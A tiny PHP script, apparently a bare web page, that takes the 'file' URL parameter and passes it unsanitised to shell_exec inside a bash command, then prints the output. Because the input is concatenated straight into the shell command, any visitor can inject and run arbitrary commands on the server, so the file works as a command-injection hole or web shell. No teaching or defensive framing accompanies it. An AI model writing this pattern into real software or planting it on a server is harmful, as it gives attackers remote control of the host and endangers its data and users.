<?php

$a=$_GET['file'];
$output = shell_exec("bash /home/test/"."$a");
echo "<pre>$output</pre>";

?>
